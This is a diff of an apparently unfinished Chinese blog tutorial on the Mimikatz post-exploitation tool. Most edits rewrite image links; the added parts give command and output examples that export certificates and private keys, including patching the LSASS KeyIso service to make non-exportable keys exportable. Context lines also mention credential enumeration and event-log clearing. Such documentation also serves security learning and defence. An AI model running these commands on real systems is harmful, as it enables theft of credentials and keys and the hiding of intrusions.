@@ -73,7 +73,7 @@ function activateLightMode(){
 <p>前言</p>
 </blockquote>
 <p>我没写完！！！！！！！！！才写一半慢慢写！！！！！！！！</p>
-<h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><p><a href="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/1.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="1" class="fancybox"><img alt="1" title="1" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/1.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
+<h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><p><a href="/img/loading.gif" data-fancybox="group" data-caption="1" class="fancybox"><img alt="1" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/1.png?raw=true" src="/img/loading.gif" class="lazyload" title="1"></a></p>
 <ul>
 <li><p><code>exit</code>:退出当前程序</p>
 </li>
@@ -99,7 +99,7 @@ function activateLightMode(){
 </li>
 </ul>
 <h3 id="使用模块"><a href="#使用模块" class="headerlink" title="使用模块"></a>使用模块</h3><p>输入<code>::</code>显示其支持模块信息。</p>
-<p><a href="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/2.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="2" class="fancybox"><img alt="2" title="2" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/2.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption="2" class="fancybox"><img alt="2" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/2.png?raw=true" src="/img/loading.gif" class="lazyload" title="2"></a></p>
 <blockquote>
 <p>standard：标准模块，基本命令，不需要模块信息</p>
 </blockquote>
@@ -108,7 +108,7 @@ function activateLightMode(){
 <p>crypto：加密模块，其后跟以下参数</p>
 </blockquote>
 <p>下图是参数列表</p>
-<p><a href="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/3.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="3" class="fancybox"><img alt="3" title="3" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/3.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption="3" class="fancybox"><img alt="3" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/3.png?raw=true" src="/img/loading.gif" class="lazyload" title="3"></a></p>
 <p> CRYPTO模块提供了与Windows加密功能（<a href="https://msdn.microsoft.com/en-us/library/ms867086.aspx" target="_blank" rel="noopener">CryptoAPI</a>）交互的高级功能。<br>通常的用途是导出未标记为“可导出”的证书。</p>
 <table>
 <thead>
@@ -190,10 +190,36 @@ function activateLightMode(){
 
 
 
-
-
 </li>
 </ul>
+</li>
+</ul>
+<ul>
+<li><p><strong>sc</strong></p>
+<p>能列出读取智能卡或者令牌读取器，如果用CSP的时候能读取出智能卡的密钥</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # crypto::sc</span><br><span class="line">SmartCard readers:</span><br><span class="line"></span><br><span class="line"> * OMNIKEY CardMan 3x21 0</span><br><span class="line">    ATR  : 3bb794008131fe6553504b32339000d1</span><br><span class="line">    Model: G&amp;D SPK 2.3 T&#x3D;1</span><br><span class="line">    CSP  : SafeSign Standard Cryptographic Service Provider</span><br><span class="line"></span><br><span class="line"> 0. 34C99D73A1FAE4D44F9966DF626623DF18858C83</span><br><span class="line">    34C99D73A1FAE4D44F9966DF626623DF18858C83</span><br><span class="line">        Type           : AT_KEYEXCHANGE (0x00000001)</span><br><span class="line">        Exportable key : NO</span><br><span class="line">        Key size       : 1024</span><br><span class="line"></span><br><span class="line"> * SCM Microsystems Inc. SCR35xx USB Smart Card Reader 0</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p><strong>scauth</strong></p>
+<p>创建用于用于智能卡身份验证的客户端证书</p>
+<p>该命令中的参数</p>
+<ul>
+<li><p><code>/caname</code></p>
+<p>证书颁发机构的主题名称（需要签署证书）</p>
+</li>
+<li><p><code>/castore</code> 可选</p>
+<p>包含证书颁发机构的系统存储（默认值：<code>CERT_SYSTEM_STORE_LOCAL_MACHINE</code>）</p>
+</li>
+<li><p><code>/upn</code></p>
+<p>指定的用户主体名称（<strong>UPN</strong>）（例如：<code>user@lab.local</code>）</p>
+</li>
+<li><p><code>/pfx</code> 可选</p>
+<p>保存最终证书的文件名（默认：无文件，存储在<code>CERT_SYSTEM_STORE_CURRENT_USER</code>中）</p>
+</li>
+</ul>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # crypto::scauth &#x2F;caname:KiwiAC &#x2F;upn:user@lab.local &#x2F;pfx:user.pfx</span><br><span class="line">CA store       : LOCAL_MACHINE</span><br><span class="line">CA name        : KiwiAC</span><br><span class="line">CA validity    : 22&#x2F;08&#x2F;2016 22:00:36 -&gt; 22&#x2F;08&#x2F;2021 22:10:35</span><br><span class="line">Certificate UPN: user@lab.local</span><br><span class="line">Key container  : &#123;a1bd29ec-4203-4aac-8159-40f28f96335b&#125;</span><br><span class="line">Key provider   : Microsoft Enhanced Cryptographic Provider v1.0</span><br><span class="line">Private Export : user.pfx - OK</span><br></pre></td></tr></table></figure></div>
+
+
+
 </li>
 </ul>
 <ul>
@@ -203,19 +229,49 @@ function activateLightMode(){
 <li><strong>/systemstore</strong> –可选–必须使用的系统存储（默认值：CERT_SYSTEM_STORE_CURRENT_USER）</li>
 <li><strong>/store</strong> –可选–必须用于列出/导出证书的存储（默认：My）–带有crypto::stores的完整列表</li>
 <li><strong>/export</strong> –可选–将所有证书导出到文件（DER中的公共部分，PFX文件中的私有部分–密码保护：mimikatz）</li>
+<li><strong>/silent</strong> –可选–如果需要用户交互，则中止</li>
+<li><strong>/nokey</strong> –可选–不要尝试与私钥进行交互</li>
 </ul>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # crypto::capi</span><br><span class="line">Local CryptoAPI patched</span><br><span class="line"></span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege &#39;20&#39; OK</span><br><span class="line"></span><br><span class="line">mimikatz # crypto::cng</span><br><span class="line">&quot;KeyIso&quot; service patched</span><br><span class="line"></span><br><span class="line">mimikatz # crypto::certificates &#x2F;systemstore:local_machine &#x2F;store:my &#x2F;export</span><br><span class="line"> * System Store  : &#39;local_machine&#39; (0x00020000)</span><br><span class="line"> * Store         : &#39;my&#39;</span><br><span class="line"></span><br><span class="line"> 0. example.domain.local</span><br><span class="line">        Key Container  : example.domain.local</span><br><span class="line">        Provider       : Microsoft Software Key Storage Provider</span><br><span class="line">        Type           : CNG Key (0xffffffff)</span><br><span class="line">        Exportable key : NO</span><br><span class="line">        Key size       : 2048</span><br><span class="line">        Public export  : OK - &#39;local_machine_my_0_example.domain.local.der&#39;</span><br><span class="line">        Private export : OK - &#39;local_machine_my_0_example.domain.local.pfx&#39;</span><br></pre></td></tr></table></figure></div>
+
+
+
 </li>
+</ul>
+<ul>
 <li><p><strong>hash</strong></p>
 <p>使用可选的用户名对密码进行哈希处理</p>
 </li>
 <li><p><strong>keys</strong></p>
-<p><a href="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/6.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="3" class="fancybox"><img alt="3" title="3" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/6.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
+<p>参数列表</p>
+<ul>
+<li><code>/provider</code> - 可选 - 旧版CryptoAPI提供程序（默认值：MS_ENHANCED_PROV）</li>
+<li><code>/providertype</code> - 可选 - 旧版CryptoAPI提供程序类型（默认值：PROV_RSA_FULL）</li>
+<li><code>/cngprovider</code> - 可选 - CNG提供程序（默认：Microsoft软件密钥存储提供程序）</li>
+<li><code>/export</code> - 可选 - 将所有密钥导出到PVK文件</li>
+<li><code>/silent</code> - 可选 - 如果需要用户交互，则中止</li>
+</ul>
+<p>提供者详细信息的完整列表<code>crypto::providers</code></p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # crypto::keys &#x2F;export</span><br><span class="line"> * Store         : &#39;user&#39;</span><br><span class="line"> * Provider      : &#39;MS_ENHANCED_PROV&#39; (&#39;Microsoft Enhanced Cryptographic Provider v1.0&#39;)</span><br><span class="line"> * Provider type : &#39;PROV_RSA_FULL&#39; (1)</span><br><span class="line"> * CNG Provider  : &#39;Microsoft Software Key Storage Provider&#39;</span><br><span class="line"></span><br><span class="line">CryptoAPI keys :</span><br><span class="line"></span><br><span class="line"> 0. myCapiKey</span><br><span class="line">    223311d3b5d990f48c65070b883b9ef1_33b8db1c-b3d2-4912-b24e-fc0742b704c1</span><br><span class="line">        Type           : AT_KEYEXCHANGE (0x00000001)</span><br><span class="line">        Exportable key : YES</span><br><span class="line">        Key size       : 2048</span><br><span class="line">        Private export : OK - &#39;user_capi_0_myCapiKey.pvk&#39;</span><br><span class="line"></span><br><span class="line"> 1. OC_KeyContainer_Lync_user@domain.local</span><br><span class="line">    49e3a9228aa9a33357545413fba35d07_33b8db1c-b3d2-4912-b24e-fc0742b704c1</span><br><span class="line">        Type           : AT_SIGNATURE (0x00000002)</span><br><span class="line">        Exportable key : NO</span><br><span class="line">        Key size       : 2048</span><br><span class="line">        Private export : KO - ERROR kuhl_m_crypto_exportKeyToFile ; Export &#x2F; CreateFile (0x8009000b)</span><br><span class="line"></span><br><span class="line">CNG keys :</span><br><span class="line"></span><br><span class="line"> 0. mykey-d535a6d8-70f5-496f-8c85-17c8fd26f379</span><br><span class="line">    98a436bd6f4caa9b24379112b577f688_33b8db1c-b3d2-4912-b24e-fc0742b704c1</span><br><span class="line">        Exportable key : NO</span><br><span class="line">        Key size       : 2048</span><br><span class="line">        Private export : KO - ERROR kuhl_m_crypto_exportKeyToFile ; Export &#x2F; CreateFile (0x80090029)</span><br></pre></td></tr></table></figure></div>
+
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption="3" class="fancybox"><img alt="3" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/6.png?raw=true" src="/img/loading.gif" class="lazyload" title="3"></a></p>
+</li>
+<li><p><strong>cng</strong></p>
+<p>此补丁在LSASS进程中修改KeyIso服务，以使不可导出的密钥可导出。仅当密钥提供者是Microsoft软件密钥存储提供者（您无需为其他提供者修补CNG）时，此功能才有用。可以与<code>crypto::certificates</code>和<code>crypto::keys</code>一起使用</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege &#39;20&#39; OK</span><br><span class="line"></span><br><span class="line">mimikatz # crypto::cng</span><br><span class="line">&quot;KeyIso&quot; service patched</span><br></pre></td></tr></table></figure></div>
+
+
+
+
+
+
+
 </li>
 </ul>
 <blockquote>
 <p>sekurlsa 枚举用户凭证</p>
 </blockquote>
-<p><a href="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/4.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="3" class="fancybox"><img alt="3" title="3" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/4.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption="3" class="fancybox"><img alt="3" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/4.png?raw=true" src="/img/loading.gif" class="lazyload" title="3"></a></p>
 <table>
 <thead>
 <tr>
@@ -294,7 +350,7 @@ function activateLightMode(){
 <blockquote>
 <p>privilege 特权模块</p>
 </blockquote>
-<p><a href="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/5.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="3" class="fancybox"><img alt="3" title="3" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/5.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption="3" class="fancybox"><img alt="3" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/5.png?raw=true" src="/img/loading.gif" class="lazyload" title="3"></a></p>
 <table>
 <thead>
 <tr>
@@ -385,32 +441,32 @@ function activateLightMode(){
 <ul>
 <li><p><strong>list</strong></p>
 <p>列出正在运行的进程，左边为PID右边是进程名字</p>
-<p><a href="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/7.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="3" class="fancybox"><img alt="3" title="3" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/7.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption="3" class="fancybox"><img alt="3" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/7.png?raw=true" src="/img/loading.gif" class="lazyload" title="3"></a></p>
 </li>
 <li><p><strong>exports</strong>和<strong>imports</strong></p>
 <p>这两个参数我没搞懂他有啥用，使用后一堆显示一堆windows API，疯狂刷屏</p>
 </li>
 <li><p><strong>start</strong></p>
 <p>后跟进程的绝对路径，并且用<code>&quot;&quot;</code>号包含。比如启动计算器<code>process::start &quot;C:\Windows\SysWOW64\calc.exe&quot;</code></p>
-<p><a href="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/8.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="3" class="fancybox"><img alt="3" title="3" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/8.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption="3" class="fancybox"><img alt="3" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/8.png?raw=true" src="/img/loading.gif" class="lazyload" title="3"></a></p>
 </li>
 <li><p><strong>stop</strong></p>
 <p>用法<code>process::stop /pid:5376</code>（结束 pid 为5376的进程，注意空格别漏了）</p>
-<p><a href="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/9.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="3" class="fancybox"><img alt="3" title="3" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/9.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption="3" class="fancybox"><img alt="3" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/9.png?raw=true" src="/img/loading.gif" class="lazyload" title="3"></a></p>
 </li>
 <li><p><strong>suspend</strong></p>
 <p>挂起一个进程，挂起的进程点击它没有任何反应</p>
-<p><a href="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/10.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="3" class="fancybox"><img alt="3" title="3" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/10.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption="3" class="fancybox"><img alt="3" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/10.png?raw=true" src="/img/loading.gif" class="lazyload" title="3"></a></p>
 </li>
 <li><p><strong>resume</strong></p>
 <p>可以恢复挂起的进程，如下图恢复了记事本的运行</p>
-<p><a href="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/11.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="3" class="fancybox"><img alt="3" title="3" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/11.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption="3" class="fancybox"><img alt="3" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/11.png?raw=true" src="/img/loading.gif" class="lazyload" title="3"></a></p>
 </li>
 <li><p><strong>run</strong></p>
 <p>他会去寻找你想运行的<code>exe</code>进程，用法<code>process::run calc.exe</code></p>
-<p><a href="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/12.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="3" class="fancybox"><img alt="3" title="3" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/12.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption="3" class="fancybox"><img alt="3" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/12.png?raw=true" src="/img/loading.gif" class="lazyload" title="3"></a></p>
 <p>运行<code>cmd.exe</code></p>
-<p><a href="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/13.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="3" class="fancybox"><img alt="3" title="3" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/13.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption="3" class="fancybox"><img alt="3" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/13.png?raw=true" src="/img/loading.gif" class="lazyload" title="3"></a></p>
 </li>
 </ul>
 <blockquote>
@@ -468,18 +524,18 @@ function activateLightMode(){
 <ul>
 <li><p><strong>stop</strong></p>
 <p>暂停某个服务</p>
-<p><a href="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/14.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="3" class="fancybox"><img alt="3" title="3" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/14.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption="3" class="fancybox"><img alt="3" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/14.png?raw=true" src="/img/loading.gif" class="lazyload" title="3"></a></p>
 </li>
 <li><p><strong>start</strong></p>
-<p><a href="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/15.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="3" class="fancybox"><img alt="3" title="3" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/15.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption="3" class="fancybox"><img alt="3" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/15.png?raw=true" src="/img/loading.gif" class="lazyload" title="3"></a></p>
 </li>
 <li><p><strong>remove</strong></p>
 <p>当我们删除一个服务的时候，如果改任务还在运行的话，你不会看到该服务消失，只有你删除的服务暂停运行的时候，该服务就会从列表中消失，看下图，删除后我们还能停止他，但是后面就不能启动他了，因为他已经不存在了</p>
-<p><a href="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/16.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="3" class="fancybox"><img alt="3" title="3" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/16.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption="3" class="fancybox"><img alt="3" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/16.png?raw=true" src="/img/loading.gif" class="lazyload" title="3"></a></p>
 </li>
 <li><p><strong>+ -</strong>和<strong>- -</strong></p>
 <p>分别是安装和卸载<code>mimikatz</code>服务</p>
-<p><a href="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/17.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="3" class="fancybox"><img alt="3" title="3" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/17.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption="3" class="fancybox"><img alt="3" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/17.png?raw=true" src="/img/loading.gif" class="lazyload" title="3"></a></p>
 </li>
 <li><p>其他命令用法没什么好讲的这里就不再概述了</p>
 </li>
@@ -557,7 +613,7 @@ function activateLightMode(){
 <ul>
 <li><p><strong>sessions</strong></p>
 <p>该命令有点像<code>linux</code>上面的查看ssh终端有谁登录，上面时候登录，登录了多久一样</p>
-<p><a href="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/18.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="image-20200414223024341" class="fancybox"><img alt="image-20200414223024341" title="image-20200414223024341" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/18.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption="image-20200414223024341" class="fancybox"><img alt="image-20200414223024341" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/18.png?raw=true" src="/img/loading.gif" class="lazyload" title="image-20200414223024341"></a></p>
 </li>
 <li><p><strong>multirdp</strong></p>
 <p>没有用过这个，站个坑后面会了在写</p>
@@ -590,9 +646,9 @@ function activateLightMode(){
 <p>清除日志</p>
 </li>
 </ul>
-<p><a href="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/19.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="image-20200414223725607" class="fancybox"><img alt="image-20200414223725607" title="image-20200414223725607" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/19.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
+<p><a href="/img/loading.gif" data-fancybox="group" data-caption="image-20200414223725607" class="fancybox"><img alt="image-20200414223725607" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/19.png?raw=true" src="/img/loading.gif" class="lazyload" title="image-20200414223725607"></a></p>
 <p>​        安全位置的日志全被清空了</p>
-<p>​        <a href="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/20.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="image-20200414224028608" class="fancybox"><img alt="image-20200414224028608" title="image-20200414224028608" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/20.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
+<p>​        <a href="/img/loading.gif" data-fancybox="group" data-caption="image-20200414224028608" class="fancybox"><img alt="image-20200414224028608" data-src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/20.png?raw=true" src="/img/loading.gif" class="lazyload" title="image-20200414224028608"></a></p>
 <blockquote>
 <p>misc 杂项模块</p>
 </blockquote>
